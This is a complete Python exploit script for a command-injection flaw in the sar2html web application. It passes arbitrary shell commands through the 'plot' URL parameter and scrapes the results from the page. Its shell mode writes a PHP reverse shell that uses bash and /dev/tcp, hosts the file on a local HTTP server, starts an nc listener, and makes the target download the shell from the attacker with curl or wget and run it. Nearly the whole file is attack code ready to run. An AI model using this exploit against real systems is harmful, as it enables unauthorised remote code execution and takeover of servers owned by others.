from argparse import ArgumentParser
from requests import get
from bs4 import BeautifulSoup as bs
from urllib3 import disable_warnings, exceptions
from os import remove, system
from time import sleep
from subprocess import Popen

disable_warnings(exceptions.InsecureRequestWarning)  #DISABLE INSECURE HTTPS REQUESTS

parser = ArgumentParser(description="Exploit [sar2html] Vulnerability", epilog="./app.py http://IP:80 --command ls")
parser.add_argument("url", metavar="<URL>", type=str, help="PATH to sar2html base (URL location)")
parser.add_argument("--command", metavar="", type=str, help='Manual Command injection! [for complex commands => "<command>"]')
parser.add_argument("--shell_mode", action='store_true', help="Reverse_shell mode => [upload rev_shell]")
args = parser.parse_args()

url = args.url
command = args.command
shell_mode = args.shell_mode

results = [] #COMMAND INJECTION OUTPUT
irrelevant = ["Select Host", "HPUX", "Linux", "There is no defined host...", "SunOS"] #IRRELEVANT OUTPUT 


def shell_upload(target, LHOST, LPORT): 
    
    curl_injection = target + f"?plot=;curl http://{LHOST}:8000/shell.php -o shell.php" #INJECT THE CURL COMMAND TO UPLOAD REV_SHELL ON THE TARGET MACHINE
    wget_injection =  target + f"?plot=;wget http://{LHOST}:8000/shell.php" #INJECT WGET COMMAND IN CASE CURL IS NOT AVAILABLE ON THE SYSTEM

    payload_file = f"""<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'");?>""" #CREATE REVERSE_SHELL
    file = open("shell.php", "w")
    file.write(payload_file)
    file.close()

    print("\n[+] Creating process...")
    system("nohup python3 -m http.server 8000 </dev/null >/dev/null 2>&1 &") #OPEN AN HTTP SERVER SO YOU CAN MAKE YOUR SHELL AVAILABLE
    print("\n---> Server started http://%s:%s" % ("127.0.0.1", "8000"))
    Popen(["nc", "-lp", f"{LPORT}"]) #HANDLER STARTED...
    print(f"---> Listening on port {LPORT}\n")
    sleep(2) #WAITING 2 SECONDS...

    curl_response = bs(get(url=target + "?plot=;whereis -b curl").content, "html.parser") #CHECKING '/usr/bin/curl' EXISTANCE 
    wget_response = bs(get(url=target + "?plot=;whereis -b wget").content, "html.parser") #CHECKING '/usr/bin/wget' EXISTANCE
    Filter_curl = curl_response.select_one('select[class="select_text"]').select("option") 
    Filter_wget = wget_response.select_one('select[class="select_text"]').select("option")

    for output1 in Filter_curl:
        for output2 in Filter_wget:

            if output1.get_text() in irrelevant or output2.get_text() in irrelevant:
                pass
            else:
                results.append(output1.get_text())
                results.append(output2.get_text())

    if "curl: /usr/bin/curl" in results[0] or "curl: /usr/bin/curl /usr/include/curl" in results[0]: #EXECUTE COMMAND INJECTION IF CURL EXISTS
        
        print("[!] SHELL upload is possible in the target!\n")
        
        get(url=curl_injection)
        print("Spawning your shell :)\n")
        get(url=target + "?plot=;php shell.php") #REMOTELY ENABLING THE REVERSE SHELL
        remove("shell.php")
        return "\n[✓] Done\n"

    elif "wget: /usr/bin/wget" in results[0]: #EXECUTE COMMAND INJECTION IF WGET EXISTS
       
        print("[-] Curl is not enabled in the target system. Trying WGET...\n")
        print("[!] SHELL upload is possible in the target!\n")
        
        get(url=wget_injection)
        print("Spawning your shell! :)\n")
        get(url=target + "?plot=;php shell.php") #REMOTELY ENABLING THE REVERSE SHELL
        remove("shell.php")
        return "\n[✓] Done\n"

    else:
        return "[X] Shell can't be uploaded :(\n" #ABORT 'shell_mode' IF CURL AND WGET ARE NOT AVAILABLE


def main(target, command):

    try:
        exploit = get(url=target + f"?plot=;{command}") #SEND COMMAND IN URL
        HTML_page = bs(exploit.content, "html.parser")
        Filter = HTML_page.select_one('select[class="select_text"]').select("option") #FILTER OUTPUT
        
        for output in Filter:
            if output.get_text() in irrelevant: #IGNORE IRRELEVANT OUTPUTS
                pass
            else:
                results.append(output.get_text()) #ADD THE RESULTS

        print("\n[+] Got results!")
        print("\n" + "---" * 15 + "OUTPUT" + '---' * 15 + "\n")
        output_files = [print(i) for i in results] #PRINT THE RESULTS
        print("\n" + "---" * 15 + "OUTPUT" + '---' * 15 + "\n")

        return "[✓] Done!\n"

    except AttributeError:
        return "[X] Sar2html base not found! Are you sure this is the right path?\n"
    except TimeoutError:
        return "[X] TIMEOUT! Try again!\n"


if __name__ == '__main__':

    if url is not None and command is not None:

        if get(url=url).status_code == 200:

            print("\n[+] URL found! Starting command injection...")
            print(main(target=url, command=command))
        else:
            print("\n[X] URL not found! :(")

    elif url is not None and shell_mode is not None:
        if get(url=url).status_code == 200:
            
            print("\n[+] URL found! Starting shell upload...")
            print("---" * 10)
            lhost = input("LHOST= ")
            lport = input("LPORT= ")
            print("---" * 10)

            print(shell_upload(target=url, LHOST=lhost, LPORT=lport))
        else:
            print("\n[X] URL not found! :(")


